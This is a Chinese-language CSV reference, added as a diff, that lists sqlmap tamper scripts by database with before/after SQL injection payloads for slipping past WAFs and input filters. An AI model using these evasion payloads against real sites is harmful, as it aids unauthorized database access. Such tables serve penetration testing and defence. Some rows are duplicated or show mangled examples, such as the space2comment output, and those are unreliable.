@@ -1,0 +1,216 @@
+支持的数据库,编号,脚本名称,功能说明,实际应用例子,测试通过的数据库类型及其版本
+ALL,1,"apostrophemask.py
+","把 单引号' 替换为 utf8全宽度等价物 即 单引号' 替换为 %EF%BC%87","(""1 AND '1'='1"") 
+'1 AND %EF%BC%871%EF%BC%87=%EF%BC%871'",
+,2,base64encode.py,把 全部payload字符 替换为 它们经过base64编码后的字符  原文:Base64-encodes all characters in a given payload,"(""1' AND SLEEP(5)#"")
+'MScgQU5EIFNMRUVQKDUpIw=='",
+,3,multiplespaces.py,SQL关键字字符串的前后 添加多个空格 ,"('1 UNION SELECT foobar')
+'1    UNION     SELECT   foobar'",
+,4,space2plus.py,把 空格 替换为 + ,"('SELECT id FROM users')
+'SELECT+id+FROM+users'
+",
+,5,"nonrecursivereplacement.py (已被删除 sqlmap 1.3.1.25中没有该脚本)","把 SQL关键字字符串 替换为 对应的两次重复字符串 （例如某网站只进行一次 将SQL关键字SELECT替换为空 而不是递归替换SQL关键字 所以这个网站可用该脚本进行注入） 该脚本适用于非常弱的自定义过滤器","('1 UNION SELECT 2--')
+'1 UNIOUNIONN SELESELECTCT 2--'",
+,6,space2randomblank.py,"代替空格字符（“”）从一个随机的空
+白字符可选字符的有效集","('SELECT id FROM users')
+'SELECT%0Did%0DFROM%0Ausers'",
+,7,unionalltounion.py,替换UNION ALL SELECT UNION SELECT,"('-1 UNION ALL SELECT')
+'-1 UNION SELECT'",
+,8,"securesphere.py (已被删除 sqlmap 1.3.1.25中没有该脚本)","追加特制的字符串 以前可用来绕过Imperva SecureSphere WAF","('1 AND 1=1')
+""1 AND 1=1 and '0having'='0having'""",
+,,,,,
+"MSSQL Microsoft SQL Server",1,space2dash.py,"把 空格 替换为 字符--跟一些随机字符串 再跟 \n 即 空格 替换为 —nVNaVoPYeva%0A","('1 AND 9227=9227')
+'1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227'","* MSSQL * SQLite"
+,2,"equaltolike.py
+",把 = 替换为 LIKE,"('SELECT * FROM users WHERE id=1')
+'SELECT * FROM users WHERE id LIKE 1’","* Microsoft SQL Server 2005 * MySQL 4, 5.0 and 5.5"
+,3,space2mssqlblank.py,把 空格 替换为 有效的空白的符号（从中随机挑选一个）,"SELECT id FROM users
+SELECT%08id%02FROM%0Fusers","* Microsoft SQL Server 2000
+* Microsoft SQL Server 2005"
+,4,space2mssqlhash.py,"把 空格 替换为 #跟\n 即 空格 替换为 %23%0A","('1 AND 9227=9227')
+'1%23%0AAND%23%0A9227=9227'","* MSSQL
+* MySQL"
+,5,between.py,"把 > 替换为 NOT BETWEEN 0 AND # 把 = 替换为 BETWEEN # AND #  BETWEEN子句是SQL标准。因此，这个脚本应该适用所有(?)数据库","('1 AND A > B--')
+'1 AND A NOT BETWEEN 0 AND B--'  ('1 AND A = B--')
+'1 AND A BETWEEN B AND B--'","* Microsoft SQL Server 2005
+* MySQL 4, 5.0 and 5.5
+* Oracle 10g
+* PostgreSQL 8.3, 8.4, 9.0"
+,6,percentage.py,"在每一个字符前面添加一个%号 如 SELECT 替换为 %S%E%L%E%C%T  本脚本只支持ASP的web程序","SELECT FIELD FROM TABLE
+%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E","* Microsoft SQL Server 2000, 2005
+* MySQL 5.1.56, 5.5.11
+* PostgreSQL 9.0"
+,7,sp_password.py,"追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾 参考 http://websec.ca/kb/sql_injection","('1 AND 9227=9227-- ')
+'1 AND 9227=9227-- sp_password'",* MSSQL
+,8,charencode.py,url编码(不处理已经被url编码过了的),"* Input: SELECT FIELD FROM%20TABLE
+* Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45","* Microsoft SQL Server 2005
+* MySQL 4, 5.0 and 5.5
+* Oracle 10g
+* PostgreSQL 8.3, 8.4, 9.0"
+,9,randomcase.py,随机大小写,"* Input: INSERT
+* Output: InsERt
+",
+,10,charunicodeencode.py,字符串 unicode 编码,"* Input: SELECT FIELD%20FROM TABLE
+* Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′",
+,11,space2comment.py,Replaces space character (‘ ‘) with comments ‘/**/’,"* Input: SELECT id FROM users
+* Output: SELECT//id//FROM/**/users
+",
+MYSQL,1,"equaltolike.py
+",把 = 替换为 LIKE,"('SELECT * FROM users WHERE id=1')
+'SELECT * FROM users WHERE id LIKE 1’","* Microsoft SQL Server 2005 * MySQL 4, 5.0 and 5.5"
+,2,greatest.py,"绕过过滤’>’ ,用GREATEST替换大于号。","('1 AND A > B')
+'1 AND GREATEST(A,B+1)=A'","* MySQL 4, 5.0 and 5.5
+* Oracle 10g
+* PostgreSQL 8.3, 8.4, 9.0"
+,3,apostrophenullencode.py,绕过过滤双引号，替换字符和双引号。,"tamper(""1 AND '1'='1"")
+
+'1 AND %00%271%00%27=%00%271'","* MySQL 4, 5.0 and 5.5
+* Oracle 10g
+* PostgreSQL 8.3, 8.4, 9.0"
+,4,ifnull2ifisnull.py,"绕过对 IFNULL 过滤。
+替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’","('IFNULL(1, 2)')
+'IF(ISNULL(1),2,1)'",* MySQL 5.0 and 5.5
+,5,space2mssqlhash.py,"把 空格 替换为 字符#跟一个\n 即  空格 替换为 %23%0A","('1 AND 9227=9227')
+'1%23%0AAND%23%0A9227=9227'","* MSSQL
+* MySQL"
+,6,modsecurityversioned.py,过滤空格，包含完整的查询版本注释,"('1 AND 2>1--')
+'1 /*!30874AND 2>1*/--'",* MySQL 5.0
+,7,space2hash.py,"把 空格 替换为 符号#(即%23) 跟 一个随机字符串 再跟 一个\n 即 空格 替换为 %23nVNaVoPYeva%0A","('1 AND 9227=9227')
+'1%23nVNaVoPYeva%0AAND%23ngNvzqu%0A9227=9227'"," * MySQL 4.0, 5.0
+"
+,8,space2mysqlblank.py,空格替换其它空白符号(mysql),"Input: SELECT id FROM users
+Output: SELECT%0Bid%0BFROM%A0users",* MySQL 5.1
+,9,between.py,用between替换大于号（>）,"('1 AND A > B--')
+'1 AND A NOT BETWEEN 0 AND B--'","* Microsoft SQL Server 2005
+* MySQL 4, 5.0 and 5.5
+* Oracle 10g
+* PostgreSQL 8.3, 8.4, 9.0"
+,10,0x2char.py,"MySQL语句中 把 每个以0x<hex>编码的字符串  替换为等价的字符串 CONCAT(CHAR(),…) 当Web应用程序对英文字符做大写转换时很有用","(’SELECT 0xdeadbeef')
+'SELECT CONCAT(CHAR(222),CHAR(173),CHAR(190),CHAR(239))’","* MySQL 4, 5.0 and 5.5"
+,11,modsecurityzeroversioned.py,包含了完整的查询与零版本注释,"('1 AND 2>1--')
+'1 /*!00000AND 2>1*/--'",* MySQL 5.0
+,12,space2mysqldash.py,替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）,"('1 AND 9227=9227')
+'1--%0AAND--%0A9227=9227'",
+,13,bluecoat.py,"代替空格字符后与一个有效的随机空白字符的SQL语句。
+然后替换=为like","('SELECT id FROM users where id = 1')
+'SELECT%09id FROM users where id LIKE 1'","* MySQL 5.1, SGOS"
+,14,percentage.py,"在每一个字符前面添加一个%号 如 SELECT 替换为 %S%E%L%E%C%T  本脚本只支持ASP的web程序","* Input: SELECT FIELD FROM TABLE
+* Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E
+
+","* Microsoft SQL Server 2000, 2005
+* MySQL 5.1.56, 5.5.11
+* PostgreSQL 9.0"
+,15,charencode.py,url编码(不处理已经被url编码过了的),"SELECT FIELD FROM%20TABLE
+%53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45","* Microsoft SQL Server 2005
+* MySQL 4, 5.0 and 5.5
+* Oracle 10g
+* PostgreSQL 8.3, 8.4, 9.0"
+,16,randomcase.py,随机大小写,"* Input: INSERT
+* Output: InsERt
+","* Microsoft SQL Server 2005
+* MySQL 4, 5.0 and 5.5
+* Oracle 10g
+* PostgreSQL 8.3, 8.4, 9.0"
+,17,versionedkeywords.py,Encloses each non-function keyword with versioned MySQL comment,"* Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#
+* Output: 1/*!UNION**!ALL**!SELECT**!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS**!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#",
+,18,space2comment.py,Replaces space character (‘ ‘) with comments ‘/**/’,"* Input: SELECT id FROM users
+* Output: SELECT//id//FROM/**/users
+","* Microsoft SQL Server 2005
+* MySQL 4, 5.0 and 5.5
+* Oracle 10g
+* PostgreSQL 8.3, 8.4, 9.0"
+,19,charunicodeencode.py,字符串 unicode 编码,"* Input: SELECT FIELD%20FROM TABLE
+* Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′","* Microsoft SQL Server 2000
+* Microsoft SQL Server 2005
+* MySQL 5.1.56
+* PostgreSQL 9.0.3"
+,20,versionedmorekeywords.py,注释绕过,"* Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#
+* Output: 1/*!UNION**!ALL**!SELECT**!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS**!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#",
+* MySQL < 5.1,22,halfversionedmorekeywords.py,把 每个关键字之前 添加 mysql版本注释,"* Input: value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’='QDWa
+* Output: value’/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)), NULL, NULL#/*!0AND ‘QDWa’='QDWa","* MySQL 4.0.18, 5.0.22"
+MySQL >= 5.1.13,23,space2morehash.py,"把 空格 替换为 字符#跟一些随机字符串 再跟 \n 即 空格 替换为 %23ngNvzqu%0A 本脚本与space2hash.py基本相同 在处理前多个了函数进行匹配筛选出需要进行处理的关键字","* Input: 1 AND 9227=9227
+* Output: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227",MySQL 5.1.41
+ Oracle,1,greatest.py,"绕过过滤’>’ ,用GREATEST替换大于号。","('1 AND A > B')
+'1 AND GREATEST(A,B+1)=A'","* MySQL 4, 5.0 and 5.5
+* Oracle 10g
+* PostgreSQL 8.3, 8.4, 9.0"
+,2,apostrophenullencode.py,绕过过滤双引号，替换字符和双引号。,"tamper(""1 AND '1'='1"")
+
+'1 AND %00%271%00%27=%00%271'","* MySQL 4, 5.0 and 5.5
+* Oracle 10g
+* PostgreSQL 8.3, 8.4, 9.0"
+,3,between.py,用between替换大于号（>）,"('1 AND A > B--')
+'1 AND A NOT BETWEEN 0 AND B--'","* Microsoft SQL Server 2005
+* MySQL 4, 5.0 and 5.5
+* Oracle 10g
+* PostgreSQL 8.3, 8.4, 9.0"
+,4,charencode.py,url编码(不处理已经被url编码过了的),"SELECT FIELD FROM%20TABLE
+%53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45","* Microsoft SQL Server 2005
+* MySQL 4, 5.0 and 5.5
+* Oracle 10g
+* PostgreSQL 8.3, 8.4, 9.0"
+,5,randomcase.py,随机大小写,"* Input: INSERT
+* Output: InsERt
+","* Microsoft SQL Server 2005
+* MySQL 4, 5.0 and 5.5
+* Oracle 10g
+* PostgreSQL 8.3, 8.4, 9.0"
+,6,charunicodeencode.py,字符串 unicode 编码,"* Input: SELECT FIELD%20FROM TABLE
+* Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′","* Microsoft SQL Server 2000
+* Microsoft SQL Server 2005
+* MySQL 5.1.56
+* PostgreSQL 9.0.3"
+,7,space2comment.py,Replaces space character (‘ ‘) with comments ‘/**/’,"* Input: SELECT id FROM users
+* Output: SELECT//id//FROM/**/users
+","* Microsoft SQL Server 2005
+* MySQL 4, 5.0 and 5.5
+* Oracle 10g
+* PostgreSQL 8.3, 8.4, 9.0"
+ PostgreSQL,1,greatest.py,"绕过过滤’>’ ,用GREATEST替换大于号。","('1 AND A > B')
+'1 AND GREATEST(A,B+1)=A'","* MySQL 4, 5.0 and 5.5
+* Oracle 10g
+* PostgreSQL 8.3, 8.4, 9.0"
+,2,apostrophenullencode.py,绕过过滤双引号，替换字符和双引号。,"tamper(""1 AND '1'='1"")
+
+'1 AND %00%271%00%27=%00%271'","* MySQL 4, 5.0 and 5.5
+* Oracle 10g
+* PostgreSQL 8.3, 8.4, 9.0"
+,3,between.py,用between替换大于号（>）,"('1 AND A > B--')
+'1 AND A NOT BETWEEN 0 AND B--'","* Microsoft SQL Server 2005
+* MySQL 4, 5.0 and 5.5
+* Oracle 10g
+* PostgreSQL 8.3, 8.4, 9.0"
+,4,percentage.py,"在每一个字符前面添加一个%号 如 SELECT 替换为 %S%E%L%E%C%T  本脚本只支持ASP的web程序","SELECT FIELD FROM TABLE
+%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E","* Microsoft SQL Server 2000, 2005
+* MySQL 5.1.56, 5.5.11
+* PostgreSQL 9.0"
+,5,charencode.py,url编码(不处理已经被url编码过了的),"SELECT FIELD FROM%20TABLE
+%53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45","* Microsoft SQL Server 2005
+* MySQL 4, 5.0 and 5.5
+* Oracle 10g
+* PostgreSQL 8.3, 8.4, 9.0"
+,6,randomcase.py,随机大小写,"* Input: INSERT
+* Output: InsERt
+","* Microsoft SQL Server 2005
+* MySQL 4, 5.0 and 5.5
+* Oracle 10g
+* PostgreSQL 8.3, 8.4, 9.0"
+,7,charunicodeencode.py,字符串 unicode 编码,"* Input: SELECT FIELD%20FROM TABLE
+* Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′","* Microsoft SQL Server 2000
+* Microsoft SQL Server 2005
+* MySQL 5.1.56
+* PostgreSQL 9.0.3"
+,8,space2comment.py,Replaces space character (‘ ‘) with comments ‘/**/’,"* Input: SELECT id FROM users
+* Output: SELECT//id//FROM/**/users
+","* Microsoft SQL Server 2005
+* MySQL 4, 5.0 and 5.5
+* Oracle 10g
+* PostgreSQL 8.3, 8.4, 9.0"
+Microsoft Access,1,appendnullbyte.py,在有效负荷结束位置加载零字节字符编码,"('1 AND 1=1')
+'1 AND 1=1%00'",
+其他,,chardoubleencode.py,双url编码(不处理已经被url编码过了的),"SELECT FIELD FROM%20TABLE
+%2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545",未说明
+,,unmagicquotes.py,"宽字符绕过 GPC  addslashes bypassing magic_quotes/addslashes feature 参考 http://shiflett.org/blog/2006/jan/addslashes-versus-mysql-real-escape-string","(""1' AND 1=1"") '1%bf%27-- -'",未说明
+,,randomcomments.py,"增加随机的inline comments到sql关键字中
+如 SELECT 变为 S/**/E/**/LECT","('INSERT')
+'I/**/N/**/SERT'",未说明
